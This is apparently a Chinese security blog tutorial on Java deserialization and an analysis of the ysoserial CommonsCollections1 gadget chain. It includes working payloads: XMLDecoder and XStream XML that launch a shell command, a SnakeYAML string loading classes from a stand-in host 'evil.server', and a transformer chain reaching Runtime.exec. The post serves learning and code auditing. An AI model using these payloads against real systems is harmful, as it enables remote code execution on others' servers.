---
title: Java反序列化利用链挖掘之CommonsCollections1
tags: 
  - java
date: 2019-10-24 22:15:25
---
## 0x00 前言

<!-- more -->
前段时间在复现shiro反序列化漏洞的过程中，发现无法很好的理解CommonCollections4为什么无法执行命令，还是缺少Java的一些基础知识。所以这里就先停下了复现漏洞的进程，先将基础打扎实：）。这篇文章将记录，Java反序列化漏洞的原理以及测试环境。

参考文献都嵌入在文中。

## 0x01 基础知识

### 1. Java中的序列化和反序列化

序列化：使用`ObjectOutputStream`类的`writeObject`函数

```java
public final void writeObject(Object x) throws IOException
```

反序列化：使用`ObjectInputStream`类的`readObject`函数

```java
public final Object readObject() throws IOException, ClassNotFoundException
```

支持序列化的对象必须满足：

1. 实现了`java.io.Serializable`接口
2. 当前对象的所有类属性可序列化，如果有一个属性不想或不能被序列化，则需要指定`transient`，使得该属性将不会被序列化

举个例子(来源于[此处](http://www.runoob.com/java/java-serialization.html))

```java
public class Employee implements java.io.Serializable
{
   public String name;
   public String address;
   public transient int SSN;
   public int number;
   public void mailCheck()
   {
      System.out.println("Mailing a check to " + name
                           + " " + address);
   }
}
```

```java
import java.io.*;

public class SerializeDemo
{
   public static void main(String [] args)
   {
      Employee e = new Employee();
      e.name = "Reyan Ali";
      e.address = "Phokka Kuan, Ambehta Peer";
      e.SSN = 11122333;
      e.number = 101;
      try
      {
         FileOutputStream fileOut =
         new FileOutputStream("/tmp/employee.ser");
         ObjectOutputStream out = new ObjectOutputStream(fileOut);
         out.writeObject(e);
         out.close();
         fileOut.close();
         System.out.printf("Serialized data is saved in /tmp/employee.ser");
      }catch(IOException i)
      {
          i.printStackTrace();
      }
   }
}
```

运行后，生成employee.ser

![image-20190923193109921](/images/study_java_deseriablized/image-20190923193109921.png)

根据[序列化规范](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html)，`aced`代表java序列化数据的magic word`STREAM_MAGIC`,`0005`表示版本号`STREAM_VERSION`,`73`表示是一个对象`TC_OBJECT`,`72`表示这个对象的描述`TC_CLASSDESC`

所以在日常测试中，如果解开类似Base64后，起始为aced打头，可以尝试使用反序列化的payload。

在对其做完序列化操作后，我们在另一个JVM中恢复该对象，需要用到`ObjectInputStream`

```java
import java.io.*;

public class DeserializeDemo
{
   public static void main(String [] args)
   {
      Employee e = null;
      try
      {
         FileInputStream fileIn = new FileInputStream("/tmp/employee.ser");
         ObjectInputStream in = new ObjectInputStream(fileIn);
         e = (Employee) in.readObject();
         in.close();
         fileIn.close();
      }catch(IOException i)
      {
         i.printStackTrace();
         return;
      }catch(ClassNotFoundException c)
      {
         System.out.println("Employee class not found");
         c.printStackTrace();
         return;
      }
      System.out.println("Deserialized Employee...");
      System.out.println("Name: " + e.name);
      System.out.println("Address: " + e.address);
      System.out.println("SSN: " + e.SSN);
      System.out.println("Number: " + e.number);
    }
}
```

`readObject`函数反序列化了上面产生的二进制数据流，生成了原有的对象数据结构。需要注意的是，由于SSN为transient，其无法序列化，所以还原后其值为0。

如果在待序列化类上实现了readObject函数，反序列化过程中会自动调用该类的readObject函数。

例如在Employee类中添加函数readObject

```java
private void readObject(ObjectInputStream in) throws Exception {
  in.defaultReadObject();
  System.out.println("Employee call readObject Function");
}
```

在反序列化过程中将调用该函数

![image-20191008145635285](/images/study_java_deseriablized/image-20191008145635285.png)

### 2. 反序列化触发点扩展

上面展示了序列化和反序列化的原理，并且反序列化的触发点为`ObjectInputStream.readObject`。那么问题来了，是否Java反序列化只能由该点触发？答案当然是否定的。

除了上面的方法外，还有如下几种触发方式：

```java
ObjectInputStream.readObject// 流转化为Object
ObjectInputStream.readUnshared // 流转化为Object
XMLDecoder.readObject // 读取xml转化为Object
Yaml.load// yaml字符串转Object
XStream.fromXML// XStream用于Java Object与xml相互转化
ObjectMapper.readValue// jackson中的api
JSON.parseObject// fastjson中的api
```

Note: 对于readUnshared函数，其与readObject函数的区别暂时还没弄明白，引用网上的解释

> readUnshared方法读取对象，不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。

但其反序列化过程中仍然可以触发readObject的调用，有待弄清楚。

### 3. 扩展触发点试验

`readUnshared`函数的使用方式同`readObject`类似，这里不再叙述。这一小节主要讲各种触发点的利用方式，不讲具体的原理。原理部分留到后面分析。

#### a. XMLDecoder.readObject

```java
public static void main(String[] args){
  String poc = "poc.xml";
  try {
    FileInputStream file = new FileInputStream(poc);
    XMLDecoder decoder = new XMLDecoder(file);
    decoder.readObject();
    decoder.close();
  } catch (FileNotFoundException e) {
    e.printStackTrace();
  }
}
```

poc.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>/bin/sh</string>
            </void>
            <void index="1">
                <string>-c</string>
            </void>
            <void index="2">
                <string>open /Applications/Calculator.app</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>
```

最终可触发命令执行

#### b. Yaml.load

[参考链接](https://blog.semmle.com/swagger-yaml-parser-vulnerability/)，这里暂未试验

添加SnakeYAML库

```xml
<!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml -->
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.25</version>
</dependency>
```

```java
public static void main(String[] args) {
  String yamlStr = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                   + "[[!!java.net.URL [\"http://evil.server\"]]]]";
  Yaml yaml = new Yaml();
  Object obj = yaml.load(yamlStr);
}
```

这里的yamlStr可以用https://github.com/mbechler/marshalsec生成危害更大的payload

#### c. XStream.fromXML

[参考链接](http://www.polaris-lab.com/index.php/archives/658/)

添加XStream库

```xml
<dependency>
  <groupId>com.thoughtworks.xstream</groupId>
  <artifactId>xstream</artifactId>
  <version>1.4.10</version>
</dependency>
```

```java
public static void main(String[] args) {
//        expGen();
        String payload = "<sorted-set>\n" +
                "    <string>foo</string>\n" +
                "    <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>/bin/sh</string>\n" +
                "                    <string>-c</string>\n" +
                "                    <string>open /System/Applications/Calculator.app</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "     <action>start</action>"+
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</sorted-set>\n";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
```

#### d. 上面的6和7，留到后面分析

### 4. 小结

上面两节介绍了Java反序列化的原理，并扩展了反序列化的触发点。在实际的审计过程中，可以直接关注这些函数的调用

```java
(readObject|readUnshared|load|fromXML|readValue|parseObject)\s*\(
```

当然有些还需要看是否是有漏洞的版本

## 0x02 反序列化过程

上面大致讲诉了序列化和反序列化的使用方法，本节将调试上面的`Employee`案例，来看看在代码层面反序列化过程是怎么样的！

这里使用的是`ObjectInputStream`的反序列化方法`readObject`函数

其实整一个反序列化过程总体来说分为两步，从字符串流中根据序列化规格提取出可能的类，然后将该类使用反射机制查找或创建一个实例。其中也会有一些检查的过程，这里例子比较简单，不叙述。

来看一下查找或创建的过程

`ObjectInputStream:readObject:417`

![image-20191009165050116](/images/study_java_deseriablized/image-20191009165050116.png)

跟进ObjectInputStream的readObject类，该函数体现了整个反序列化的过程，其中其主要功能的是`readObject0`函数

`ObjectInputStream:readObject0:1515`

![image-20191009171309599](/images/study_java_deseriablized/image-20191009171309599.png)

从流中读取出当前的类型，`tc=115`此时代表Object对象，从而进入`readOrdinaryObject`

`ObjectInputStream:readOrdinaryObject:2026`

![image-20191009191352950](/images/study_java_deseriablized/image-20191009191352950.png)

该函数主要做了实例化对象的工作，其中2033行生成的ObjectStreamClass对象，会利用反射机制实例化序列化流中的对象。2044行实际的获取到该对象。

关于ObjectStreamClass的功能，它是类的序列化描述器，包含类的名字和序列版本号。使用它的lookup函数可以载入或新建该类，但这里实际上用的是newInstance来实例化当前的序列化描述器，即产生当前描述器指代的类。

> Serialization's descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method.

其中函数`readClassDesc`将从序列化流中提取出相关的类信息。这里就直接看利用反射机制获取到类的地方，位于`ObjectInputStream.resolveClass`，下图为调用链

<img src="/images/study_java_deseriablized/image-20191009193053871.png" alt="image-20191009193053871" style="zoom:50%;" />

`ObjectInputStream:resolveClass:677`

![image-20191009193404315](/images/study_java_deseriablized/image-20191009193404315.png)

这里提取了jvm中当前这个流中的类的Class对象，用于后续的newInstance。

此处整一个反射就是先通过`Class.forName`获取到当前描述器所指代的类的Class对象，后续会在`initNonProxy`或`initProxy`函数中复制该Class对象的相关信息(包括相关函数)，最后在2044行处`ObjectStreamClass.newInstance`实例化该对象。

在实例化后会用`ObjectInputStream.readSerialData`函数将序列化流中的相关数据填充进实例化后的对象中或调用当前类描述器的readObject函数。

`ObjectInputStream:readSerialData:2149`

![image-20191011113246544](/images/study_java_deseriablized/image-20191011113246544.png)

这里会根据当前的类描述器是否存在readObject函数来自动调用该函数，或者是填充序列流中的field数据。这里的readObject的调用常为利用链的一部分，例如CommonsCollections1中的`AnnotationInvocationHandler`，后文将分析该函数。

注意：由于我们用的是Serializable接口，所以上述并未提及使用Externalizable接口的情况。

到此为止，最后返回的对象就是最终我们得到的序列化前的对象。

### 小结

这里引用[浅谈Java反序列化漏洞修复方案](https://github.com/Cryin/Paper/blob/master/浅谈Java反序列化漏洞修复方案.md)

> Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。
>
> 如果类描述符是动态代理类，则调用resolveProxyClass方法来获取本地类。如果不是动态代理类则调用resolveClass方法来获取本地类。如果无法解析该类，则抛出ClassNotFoundException异常。
>
> 如果反序列化对象不是String、array、enum类型，ObjectStreamClass包含的类会在本地被检索，如果这个本地类没有实现java.io.Serializable或者externalizable接口，则抛出InvalidClassException异常。因为只有实现了Serializable和Externalizable接口的类的对象才能被序列化。

前面分析中提到最后会调用`resolveClass`获取类的Class对象，这是反序列化过程中一个重要的地方，也是必经之路，所以有研究人员提出通过重载`ObjectInputStream`的`resolveClass`来限制可以被反序列化的类

## 0x03 利用链发掘

同PHP的反序列化一样，单单发现反序列化的触发点并不能造成严重的影响。往往反序列化漏洞的危害程度取决于后续的反序列化利用链所能达到的危险程度。在java中[ysoserial](https://github.com/frohoff/ysoserial)工具给我们提供了许多常见的库存在的利用链，这一节将逐一分析这些利用链。

### 1. CommonsCollections1(jdk<=7)

[参考链接](https://security.tencent.com/index.php/blog/msg/97)

> Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。

CommonsCollection1的分析文章比较多，刚开始先从这个gadget开始分析。这里我用的分析方法是先写一个触发点，然后用ysoserial生成payload来调试。

CommonsCollections1 payload针对的commons-collections 3.1版本，先引入库

```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
  <groupId>commons-collections</groupId>
  <artifactId>commons-collections</artifactId>
  <version>3.1</version>
</dependency>
```

在ysoserial的exp中，我们可以看到一整个调用的链

![image-20191011113756573](/images/study_java_deseriablized/image-20191011113756573.png)

我们可以看到利用链的最后调用了`Runtime.getRuntime().exec()`，这意味着我们需要在前一步的链上可以达到调用任意类和方法的函数。

CommonsCollections1用的就是3.1版本下的`InvokerTransformer.transform()`

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

此处用的就是Java的反射机制，动态调用类和方法。为了能动态调用任意类函数，我们还得控制`iMethodName、iParamTypes、iArgs`，该类属性定义在InvokerTransformer的构造函数上

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}
```

那么接下来就跟php类似了，找一个类，它的类属性可控，且该类属性后续还会调用transform函数。由于完成`Runtime.getRuntime().exec()`动作需要多次调用transform函数（先调用Runtime.getRuntime再调用Runtime.exec），所以还得找一个能多次调用transform的地方，来看一下`ChainedTransformer`

```java
private final Transformer[] iTransformers;// 填充构造后的实例

public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);// 调用链，
    }
    return object;
}
```

在`Transformer`的子类下面找到能生成命令执行的利用链即可，来分析一下CommonCollections1的构造

```java
// real chain for after setup
final Transformer[] transformers = new Transformer[] {
      new ConstantTransformer(Runtime.class),// 获取Runtime对象
      new InvokerTransformer("getMethod", new Class[] {//获取Runtime.getRuntime()方法对象
         String.class, Class[].class }, new Object[] {
         "getRuntime", new Class[0] }),
      new InvokerTransformer("invoke", new Class[] {// 反射调用invoke,再invoke执行Runtime.getRuntime()方法，获取Runtime实例化对象
         Object.class, Object[].class }, new Object[] {
         null, new Object[0] }),
      new InvokerTransformer("exec",// 反射调用exec方法，执行最终的命令
         new Class[] { String.class }, execArgs),
      new ConstantTransformer(1) };
```

链的第一个结点选用的是`ConstantTransformer`，其transformer直接返回构造时的对象

```java
private final Object iConstant;// 此时iConstant置为Runtime.class
public ConstantTransformer(Object constantToReturn) {
    super();
    iConstant = constantToReturn;
}

public Object transform(Object input) {// 直接返回Runtime.class
  return iConstant;
}
```

最终的调用，类似

```java
Object obj = Runtime.class;
Class cls = obj.getClass();
Method method;
method = cls.getMethod("getMethod",new Class[] {String.class, Class[].class });
obj = method.invoke(obj, new Object[] {"getRuntime", new Class[0] });
cls = obj.getClass();
method = cls.getMethod("invoke",new Class[] {Object.class, Object[].class });
obj = method.invoke(obj, new Object[] {null, new Object[0] });
cls = obj.getClass();
method = cls.getMethod("exec",new Class[] { String.class });
method.invoke(obj, new String[] { "open /System/Applications/Calculator.app" });
```

接下来的问题是如何触发`ChainedTransformer`？搜索一下调用transform的位置，排除掉xxxTransformer类，最有可能被利用的就是`LazyMap.get`、`TransformedMap.checkSetValue`，其中checkSetValue会在setValue函数被调用的时候调用。

接下来就是找能触发上面两个利用方式的方法。

同样的，前面基础知识提到，如果一个对象的readObject函数被重载了，会优先调用重载后的readObject函数。

我们最好能在被重载的readObject函数中发现相关可控Map数据的操作(get和setValue)。

而exp中`sun.reflect.annotation.AnnotationInvocationHandler`非常符合上述的描述。

来看一下这个类的readObject实现

```java
private void readObject(java.io.ObjectInputStream s)
  throws java.io.IOException, ClassNotFoundException {
  s.defaultReadObject();

  // Check to make sure that types have not evolved incompatibly

  AnnotationType annotationType = null;
  try {
    annotationType = AnnotationType.getInstance(type);
  } catch(IllegalArgumentException e) {
    // Class is no longer an annotation type; time to punch out
    throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
  }

  Map<String, Class<?>> memberTypes = annotationType.memberTypes();

  // If there are annotation members without values, that
  // situation is handled by the invoke method.
  for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    String name = memberValue.getKey();
    Class<?> memberType = memberTypes.get(name);
    if (memberType != null) {  // i.e. member still exists
      Object value = memberValue.getValue();
      if (!(memberType.isInstance(value) ||
            value instanceof ExceptionProxy)) {
        memberValue.setValue(
          new AnnotationTypeMismatchExceptionProxy(
            value.getClass() + "[" + value + "]").setMember(
            annotationType.members().get(name)));
      }
    }
  }
}
```

在第26行处，调用了memberValue.setValue，这里的memberValue我们可以将其置为构造好的TransformedMap实例。

在这个TransformedMap实例上，valueTransformer属性被置为前文的ChainedTransformer。这样这个链就串起来了，总结一下

```
sun.reflect.annotation.AnnotationInvocationHandler.readObject()
  -> memberValue.setValue() => TransformedMap.setValue() => TransformedMap.checkSetValue()
  -> valueTransformer.transform() => ChainedTransformer.transform()
  -> 前文构造的Runtime.getRuntime().exec()
```

第二种，利用LazyMap.get()

CommonsCollections1中利用了AnnotationInvocationHandler.invoke函数

```java
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    // ...

    switch(member) {
    case "toString":
        return toStringImpl();
    case "hashCode":
        return hashCodeImpl();
    case "annotationType":
        return type;
    }

    // Handle annotation member accessors
    Object result = memberValues.get(member);

    // ...
}
```

第15行调用了memberValues.get函数，这里如果memberValues设置为构造好的LazyMap实例，将触发该利用链的执行。

那么怎么来调用invoke函数呢？这里用到了Proxy动态代理机制。在该机制下被代理的实例不管调用什么类方法，都会先调用invoke函数。

那么我们利用Proxy动态代理AnnotationInvocationHandler，并将memberValues设置为LazyMap。在AnnotationInvocationHandler.readObject函数里，第19行调用了memberValues.entrySet函数。在动态代理下会先调用invoke函数，且此时的函数名entrySet不在toString、hashCode、annotationType里，那么会最终走到第15行的位置。总结一下这个调用链

```
sun.reflect.annotation.AnnotationInvocationHandler.readObject()
  -> memberValues.entrySet()
  -> AnnotationInvocationHandler.invoke()
  -> memberValues.get() => LazyMap.get()
  -> factory.transform() => ChainedTransformer.transform()
  -> 前文构造的Runtime.getRuntime().exec()
```

这也是ysoserial的CommonsCollections1的调用链。

后续的利用链分析放在下一篇文章里。

## 0x04 总结

经过对ysoserial工具生成的反序列化利用链的调试，熟悉了Java的反序列化的一个流程。但对于exp的书写仍然有待提高。

需要注意的是，CommonCollections1和3用的override.class作为Annotation在jdk8上是不适用的，要调试这两个payload需要用jdk7，[参考](http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html)

除此之外，在调试过程中，体会到了javassist库的强大，修改jar包里的class文件非常舒服！

Proxy的动态代理机制，Java的反射机制相信会是后续学习的一个重点，继续💪！
